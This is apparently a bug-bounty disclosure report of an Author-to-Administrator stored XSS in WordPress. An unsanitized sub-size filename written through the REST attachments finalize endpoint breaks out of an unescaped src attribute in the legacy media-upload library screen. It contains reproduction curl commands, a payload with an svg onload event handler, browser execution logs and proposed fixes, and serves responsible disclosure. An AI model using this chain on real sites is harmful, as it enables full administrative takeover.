title: Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`
vulnerability_information:
## Description: `finalize_item()` stores the attacker-supplied `sub_sizes[].file` string verbatim into `_wp_attachment_metadata['sizes'][]['file']` — no `sanitize_file_name()`, no `pattern`, no `sanitize_callback`. `image_get_intermediate_size()` string-concatenates that raw value into the image URL, and `get_media_item()` echoes the resulting URL into a **single-quoted `src` attribute with no escaping whatsoever**. A filename containing `'` therefore closes the attribute and the `` element and injects arbitrary markup into an administrator's `wp-admin` page. `get_media_items()` renders *every* attachment in the library, so a single poisoned upload fires for every administrator who opens that screen — no targeting needed. ## Root cause with real file:line and verbatim code ### WRITE — unsanitized `wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php:2920-2926` (trunk; Gutenberg equivalent at `gutenberg/lib/media/class-gutenberg-rest-attachments-controller.php:838-845`): ```php $metadata['sizes'] = $metadata['sizes'] ?? array(); $metadata['sizes'][ $image_size ] = array( 'width' => $sub_size['width'] ?? 0, 'height' => $sub_size['height'] ?? 0, 'file' => $sub_size['file'] ?? '', 'mime-type' => $sub_size['mime_type'] ?? '', 'filesize' => $sub_size['filesize'] ?? 0, ); ``` The schema for `sub_sizes[].file` is only `array( 'type' => 'string' )`. `wp_update_attachment_metadata()` stores it straight into post meta; no `register_meta()` sanitize callback and no core filter touches it. Permission gate — `edit_media_item_permissions_check()` = `current_user_can( 'upload_files' )` + `update_item_permissions_check()` (`edit_post` on the attachment). An Author satisfies both on its own upload. ### PROPAGATION — raw concatenation into a URL `wp-includes/media.php:854-858` (`image_get_intermediate_size()`), released 7.0.2: ```php // Include the full filesystem path of the intermediate file. if ( empty( $data['path'] ) && ! empty( $data['file'] ) && ! empty( $imagedata['file'] ) ) { $file_url = wp_get_attachment_url( $post_id ); $data['path'] = path_join( dirname( $imagedata['file'] ), $data['file'] ); $data['url'] = path_join( dirname( $file_url ), $data['file'] ); } ``` `image_downsize()` → `wp_get_attachment_image_src()` return that string untouched. ### SINK — no escaping at all `wp-admin/includes/media.php:1602-1610` and `:1716` (released 7.0.2; trunk `:1717`): ```php $thumb_url = false; $attachment_id = (int) $attachment_id; if ( $attachment_id ) { $thumb_url = wp_get_attachment_image_src( $attachment_id, 'thumbnail', true ); if ( $thumb_url ) { $thumb_url = $thumb_url[0]; } } ``` ```php

``` No `esc_url()`, no `esc_attr()`. Compare `:3179`, `:3229` in the same file, which at least pass `$thumb_url[0]` through `set_url_scheme()`. ### REACHABLE PAGE `get_media_item()` is called by `get_media_items()`, rendered by `media_upload_library_form()` for **every attachment in the library**, served by `GET /wp-admin/media-upload.php?tab=library`, gated only by `current_user_can( 'upload_files' )` (`wp-admin/media-upload.php:19`) and with **no nonce**. Scope note verified in the lab: the modern `wp-admin/upload.php` grid is **not** affected (the value is HTML-escaped there), and neither is `post.php?post=&action=edit`. Only the legacy popup path is exploitable — I checked each of them explicitly rather than assuming. ## Steps To Reproduce: Two independent labs; identical steps. * Lab A — `cp -a wordpress-develop/src` (`7.1-beta3-62828-src`), DB `trunk357`, `php -S 127.0.0.1:8357`, base URL `http://localhost:8357`, **no plugins active**. * Lab B — clean WordPress 7.0.2 + **Gutenberg 23.6.0** active, DB `media356`, `php -S 127.0.0.1:8356`, base URL `http://localhost:8356`. Users `admin` (Administrator) and `author1` (Author), separate cookie jars. ```bash B=http://localhost:8357 # [0] the Author's own wp_rest nonce, read out of the Author's own dashboard. # (Application passwords are refused over plain HTTP on this lab, so the runs use the # ordinary login cookie + nonce -- exactly what the block editor sends.) N=$(curl -s -b author.jar "$B/wp-admin/index.php" \ | grep -oE 'createNonceMiddleware\( *"[a-f0-9]+"' | head -1 | grep -oE '[a-f0-9]{10}') # [1] Author uploads a real JPEG (cookie + X-WP-Nonce, exactly what the editor uses) curl -b author.jar -H "X-WP-Nonce: $N" \ -H "Content-Disposition: attachment; filename=txss.jpg" -H "Content-Type: image/jpeg" \ --data-binary @zap.jpg -X POST "$B/?rest_route=/wp/v2/media" # 201, id=8 # [2] Author poisons the thumbnail sub-size filename # payload: a.jpg' />

class='thumbnail' src='http://localhost:8356/wp-content/uploads/2026/07/adminimg-150x150.jpg' alt='' />

class='thumbnail' src='http://localhost:8356/wp-content/uploads/2026/07/neg-150x150.jpg' alt='' />

``` A complete attribute break-out plus an injected element carrying an event handler. ### Execution confirmed in a real browser, on the real admin URL, in the Administrator's session Headless Chromium 145 (`--headless=new`), driven over CDP, with the **Administrator's** session cookies injected via `Network.setCookie`, navigated to `http://localhost:8356/wp-admin/media-upload.php?tab=library`: ``` TITLE: "XSS-EXECUTED-localhost" SVGCOUNT: 1 HREF: "http://localhost:8356/wp-admin/media-upload.php?tab=library" BODYLEN: 41558 ``` `document.title` was rewritten by the injected `onload` handler, in the `wp-admin` origin, in an authenticated Administrator session. This is real execution on the genuine page — not a rendered fragment. ### Reproduced on WordPress Core trunk with NO plugins (port 8357) ``` $ wp eval 'echo get_post_type_object("attachment")->rest_controller_class; echo "\nversion=".$GLOBALS["wp_version"];' WP_REST_Attachments_Controller version=7.1-beta3-62828-src upload HTTP 201 XID=8 finalize HTTP 200 stored=a.jpg' />

``` Headless Chromium against the trunk lab, Administrator cookies: ``` TITLE: "XSS-EXECUTED-localhost" SVGCOUNT: 1 HREF: "http://localhost:8357/wp-admin/media-upload.php?tab=library" BODYLEN: 23626 ``` ### Negative controls (executed) ``` --- contributor -> finalize on author's attachment --- {"code":"rest_cannot_edit_image","message":"Sorry, you are not allowed to upload media on this site.","data":{"status":403}} HTTP 403 --- author -> finalize on ADMIN's attachment --- {"code":"rest_cannot_edit","message":"Sorry, you are not allowed to edit this post.","data":{"status":403}} HTTP 403 --- author unfiltered_html? --- author1 unfiltered_html=false ``` ### Screens I checked that are NOT affected (so triage does not have to) ``` upload.php HTTP 200 -> escaped/absent upload.php?mode=list HTTP 200 -> value present but HTML-escaped: ...uploads/2026/07/a.jpg' /><svg onload='document.title="XSS-EXECUTED-... post.php?post=11&action=edit HTTP 200 -> escaped/absent ``` Only `media-upload.php?tab=library` (and the other `get_media_items()` callers, `media_upload_gallery_form()` / `media_upload_type_form()`) render the raw value. ### Re-executed on a newer trunk revision (`7.1-beta3-62852`) The trunk lab auto-updated itself through `wp-cron` from `7.1-beta3-62828-src` to `7.1-beta3-62852` while it was running. Rather than pin the report to a revision the lab no longer has, I re-ran the whole chain on the newer one with the `xss.json` printed above: ``` $ wp eval 'echo $GLOBALS["wp_version"]."\n";' 7.1-beta3-62852 finalize HTTP 200 stored=a.jpg' />

TITLE: "XSS-EXECUTED-localhost" SVGCOUNT: 1 HREF: "http://localhost:8357/wp-admin/media-upload.php?tab=library" ``` Every line number cited in this report was re-derived against 62852 and is unchanged: the sink is `wp-admin/includes/media.php:1717` on trunk (`:1716` in released 7.0.2 — the one-line offset is between the two *products*, not between the two trunk revisions), the write is `class-wp-rest-attachments-controller.php:2920-2926` with the `file` key at `:2923`, and `finalize_item()` starts at `:2828`. ## Attacker privilege **Author** — `upload_files` + `edit_post` on its own attachment. Verified in the lab: ``` author1 unfiltered_html=false author1 upload_files=true contrib1 upload_files=false ``` The Author has **no** `unfiltered_html` on a single site, so this is explicitly *not* the excluded "administrator/editor may post arbitrary JS" or "self-XSS requiring unfiltered_html" case. **Victim:** any user with `upload_files` who opens the legacy media popup — in practice an Administrator. Confirmed: the payload executed in an authenticated **Administrator** session. **User interaction:** Required. The Administrator must load `/wp-admin/media-upload.php?tab=library` — a plain `GET` with **no nonce**, gated only by `current_user_can( 'upload_files' )`. It is reachable from the legacy "Add Media" iframe flow (including with the in-scope Classic Editor plugin) and, because it is a nonce-less GET, from a lure link or an iframe pointed at the admin's own site. ## Affected versions verified | Stack | Affected | Verified how | |---|---|---| | WordPress **Core trunk**, no plugins — `7.1-beta3-62828-src` and `7.1-beta3-62852` | **YES** | Payload stored + break-out in the admin response + **execution in headless Chromium**, port 8357, on both revisions | | WordPress 7.0.2 + **Gutenberg 23.6.0** (released) | **YES** | Same, port 8356 | | WordPress 7.0.2 without Gutenberg | sink present, **not reachable** at Author level | no `finalize` route registered | ## Honest limits I would rather state these than have you find them. * **The post-exploitation step was not executed.** I demonstrated arbitrary script execution in the `wp-admin` origin inside an authenticated Administrator session (`document.title` rewritten by the injected `onload`, quoted above). I did **not** go on to create an administrator or install a plugin from the payload; that is the standard, well-understood consequence of script execution in that origin, argued rather than demonstrated. * **Only the legacy popup renders the raw value.** The modern `upload.php` media grid, `upload.php?mode=list` and `post.php?post=&action=edit` all escape it — I checked each explicitly and the results are quoted above rather than assumed. So the impact requires the Administrator to open `media-upload.php?tab=library` (or another `get_media_items()` caller). It is a nonce-less `GET` gated only by `upload_files`, and it is the screen the Classic Editor's "Add Media" flow uses, but it is not a screen every administrator opens every day. This is why the vector is `UI:R`. * **The attacker must own the attachment.** `edit_media_item_permissions_check()` is a real check and it works — the negative controls above show a Contributor refused (`403 rest_cannot_edit_image`) and an Author refused against the Administrator's attachment (`403 rest_cannot_edit`). No IDOR is claimed; the whole chain runs through an attachment the Author uploaded. * **`S:C` is a judgement call.** I claim it because the payload crosses from an Author's own content into the Administrator's authenticated `wp-admin` session — a different security authority. If you prefer `S:U`, the vector `AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N` computes to **7.3**, still well above the program's 4.0 floor, and nothing in the report depends on which of the two you pick. * **On core trunk the endpoint is gated** by `is_ssl() || 'localhost' === $host || …`; my trunk lab is plain HTTP on `Host: localhost:8357`, i.e. the `'localhost' === $host` arm. I have not demonstrated it on a non-`localhost` plain-HTTP trunk install and I do not claim it works there — the claim is that it is on by default for every HTTPS site. The released Gutenberg plugin has no such gate at all. * The `

``` This escaping bug pre-dates the new endpoint and should be fixed independently of it. 2. **Reject non-basename filenames at the write** — in `wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php:2828-2933` and `gutenberg/lib/media/class-gutenberg-rest-attachments-controller.php:749-845`, require every `sub_sizes[].file` / `original_image` to satisfy `$v === sanitize_file_name( wp_basename( $v ) )`, and add that as a `validate_callback` on the schema properties. Also add the `image_size` enum `validate_callback` that `sideload` already has, so arbitrary size keys cannot be created. 3. Consider hardening `image_get_intermediate_size()` (`wp-includes/media.php:857`) to `wp_basename()` `$data['file']` before joining it into a URL, so stale poisoned metadata cannot produce a broken-out URL after the fix. ## AI tooling disclosure Per the program's guidelines and the WordPress AI Guidelines: **AI assistance:** Yes — substantial. **Tool(s):** Claude (Anthropic), used through the Claude Code agentic harness. **Used for:** source review and candidate-vulnerability search; building and running the local test harnesses; and drafting this report — the prose here is largely AI-authored and subsequently reviewed and corrected by me. **Verification:** every technical claim was verified by executing it against a local installation. Every quoted output is real observed output, not model narration; claims that did not survive that verification were removed before submission. No production host was contacted. **Responsibility:** I have reviewed the report in full and take responsibility for its content. Environment detail for re-running: two private, throwaway installs — a copy of `wordpress-develop` trunk on `php -S 127.0.0.1:8357` (`7.1-beta3-62828-src`, later `7.1-beta3-62852`) and released WordPress 7.0.2 with the released Gutenberg 23.6.0 plugin on `php -S 127.0.0.1:8356`. Every cited `file:line` was opened and read in the source shipped on those installs. The payload was stored over the REST API, the injected markup was captured from a genuine Administrator HTTP response, and execution was confirmed in headless Chromium (fresh `--user-data-dir` per run) on the real `wp-admin` URL with the Administrator's cookies injected before navigation. Negative controls and non-affected screens were checked explicitly. No production WordPress.org / WordCamp.org host or any third-party system was contacted at any point. ## Prior art / duplicate check **Verdict: known sink class, novel and again-exploitable reachability — no matching public or disclosed report for the finalize path.** Searched: HackerOne disclosed reports for attachment-filename XSS, WPScan, Patchstack, and the WordPress 7.0.3 fix list. The **output sink class** is old: **HackerOne #139245** ("WordPress core stored XSS via attachment file name") documents unescaped attachment filenames rendered by `get_media_item()` / `get_media_items()` and `class-wp-media-list-table.php`, historically created through XML-RPC `wp.newPost()` and mitigated by `sanitize_file_name()` on the upload path. This report is a distinct instance: - the *new* REST `finalize_item()` write primitive stores `sub_sizes[].file` **verbatim, with no `sanitize_file_name()`** — so the historical sanitize-on-upload mitigation is simply not on this path; - the stored value then breaks out of the still-unescaped single-quoted `src` attribute at `wp-admin/includes/media.php:1716` in released 7.0.2 — that output was never escaped; - it is not among the WordPress 7.0.3 (August 2026) fixes. I found no public report of the finalize -> `get_media_item()` path. - HackerOne #139245 (prior art, same sink class, different upload vector): https://hackerone.com/reports/139245 - WordPress 7.0.3 fix list (this bug absent): https://patchstack.com/articles/wordpress-7-0-3-released-12-vulnerabilities-found-and-fixed/ HackerOne hacktivity cannot be enumerated without authentication, so an undisclosed duplicate cannot be ruled out with certainty. ## Impact An Author with no `unfiltered_html` capability stores JavaScript that executes in an **Administrator's** browser in the `wp-admin` origin the moment the admin opens the legacy media popup. Because `media_upload_library_form()` lists the entire library, one poisoned attachment hits every administrator who ever opens that screen. The screen is a nonce-less `GET`, so it can also be delivered by a lure link or an iframe. From the `wp-admin` origin the payload can read admin nonces and silently create a new administrator (`user-new.php`), install a plugin, or edit theme files → full site compromise. This is cross-privilege stored XSS, Author → Administrator, which is exactly the class the program pays for.
